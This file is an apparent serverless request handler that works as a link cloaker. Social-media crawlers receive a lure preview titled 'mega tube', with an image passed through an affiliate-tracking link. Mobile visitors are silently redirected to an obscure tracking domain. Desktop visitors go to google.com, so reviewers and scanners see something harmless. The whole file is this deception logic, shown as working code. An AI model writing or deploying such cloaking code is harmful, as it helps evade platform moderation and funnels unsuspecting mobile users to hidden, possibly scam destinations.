export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="❤️mega tube 🧡">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://go.skimresources.com/?id=130832X1595857&isjs=1&jv=15.7.1&sref=https%3A%2F%2Fwww.gminsidenews.com%2Fthreads%2Fgm-5-7l-l76-v8-rated-at-402-hp-428-lb-ft-torque-6-6l-l78-v8-rated-at-481-hp-501-lb-ft-torque.311525%2F&url=https%3A%2F%2Fscontent.fkhi4-2.fna.fbcdn.net%2Fv%2Ft39.30808-6%2F814380428_122103882165476058_4614033111968018706_n.jpg%3Fstp%3Ddst-jpg_tt6%26cstp%3Dmx1200x630%26ctp%3Ds1200x630%26_nc_cat%3D100%26_nc_map%3Durlgen_bucketless%26ccb%3D1-7%26_nc_sid%3D127cfc%26_nc_eui2%3DAeGDnIRceOTtBYZD49OiVodjodvKbIUUh1mh28pshRSHWSd8n7LutnY2DJAOOHa0t24wwg14HWtPpkh6S1LuU1_b%26_nc_ohc%3DYximJr03MyEQ7kNvwHJLkIi%26_nc_oc%3DAdo5UOjwOJqi3Wn__Ys0d-knDgYAbtiLlpGm4VXIULx3P_AuuqUF-ZkFm-EK_6EV8q8%26_nc_zt%3D23%26_nc_ht%3Dscontent.fkhi4-2.fna%26_nc_gid%3DnyRCdmeCSVkqSg_JEgYI-Q%26_nc_ss%3D7b2a8%26oh%3D00_AQKfTGfCMWWcQr1H1C5tV8EGLB_PuX8_7ZcUFmCpUjrXWg%26oe%3D6AB28A71&xs=1&xtz=-300&xuuid=ef713e928464d8f9dcfcd3f486367f4b&xjsf=other_click__auxclick%20%5B2%5D">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://negotiatenapkin.com/xdmz8up55?key=a020f416f71ece8e252f939903b79a97", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
